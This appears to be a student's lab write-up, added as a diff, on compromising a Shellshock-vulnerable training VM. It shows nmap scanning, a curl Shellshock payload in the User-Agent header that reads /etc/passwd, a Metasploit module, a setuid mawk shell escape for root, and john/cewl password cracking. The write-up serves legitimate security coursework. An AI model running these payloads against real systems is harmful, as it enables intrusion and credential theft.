@@ -1,0 +1,53 @@
+
+Vulnerable machine given by the client.
+
+As the shellshock server and kali machine were configured on the NAT, hence they were bound to be in the same network.
+Further, I ran the command “ifconfig” to get the IP addr of my machine. Finally, I used nmap to scan the whole network by using below command
+
+2. just ran the cmd nmap -p- 10.0.2.4 to get all the open ports. Port 80 and 8080 are responsible for handling http traffic to the apache webserver on the VM
+  
+Nmap 10.0.2.0/24
+This command showed me the active hosts on the network. The IP of the vulnerable machine was 10.0.2.4 – this I got to know as this was the only IP whose port 80 was open!
+POC: https://gtvault-my.sharepoint.com/:i:/g/personal/vyadav46_gatech_edu/ETVWYOOhi4FMrghyk-tID6UBKyiHin0TVc_bQzcW5hkuUw?e=G4BkQc 
+
+first I found the command for shellshock vulnerability and I used the below command to confirm the vulnerability
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" 10.0.2.4/cgi-bin/shellshock.cgi
+ 
+Final command to get the hash 
+curl -H "user-agent: () { :; }; echo; echo; /bin/task2 vyadav46" 10.0.2.4/cgi-bin/shellshock.cgi
+Hash: 72653d83b7c1b4a75f374542e0fc34ebf9dc27cc7d99da9a28242b81f2d572d7
+
+
+
+
+Firstly, I fired up the msfconsole and then I searched for the shellshock cgi exploit in the Metasploit. The exploit used for this attack is multi/http/apache_mod_cgi_bash_env_exec and then further I Set the Rhosts as 10.0.2.4 and TargetURI as http://10.0.2.4/cgi-bin/shellshock.cgi
+ 
+Hash : 1230c661b7ae4ddb95a863e46ef86ce2537aee614c6158af3684009...
+
+
+As we know we are already in the shell, now we have to get a higher privilege user to execute the command. For that, I used a command “find / -type f -perm -04000 -ls”. This command gave me the files along with the set of permissions. Further, there was a link given in the writeup that helped me to use the mawk function that helps in running the root command.
+Command: mawk 'BEGIN {system("/bin/sh")}'
+ 
+Hash: d2bb91fd417c3b4214d62c55e834a75900f81b3f66c90947d15d3b...
+
+
+For task X, I set the payload to the meterpreter shell and navigated to /home/shellshock_server/secret_files as mentioned in writeup and downloaded the files!
+Command :  download <filename>
+Further to decrypt the ***.zip file, I used zip2john command to generate the hash of the file. Further, passing that hash to john the ripper tool. It throws the password used to access *** file.
+Password: rt******
+Hash: 7ffcf38b89c153cf173d88f8d4073427e5842c568cf1b5237a7cd...
+
+
+ firstly, generate the hash using gpg2john and then as the write up directed to use cewl to scrape the web content of the website, hence I used cewl to generate custom worldlist.
+Command: cewl -d 20 http://10.0.2.4/cgi-bin/landing1.cgi > wordlist
+And then using john made new wordlist incrementally 
+Command: john –wordlist=wordlist –rule:o1 -stdout > wordlist1.txt
+Finally used john to retrieve the password 
+Command : john –wordlist=wordlist1.txt –rules task X
+Where xxx.zip is the hash of the file ***.pyc.gpg
+ 
+Password: ***rosc***
+ 
+HASH: fab8cf2603960f7ca7685dc26c59c296f7ee75511848ae3f.....
+
+
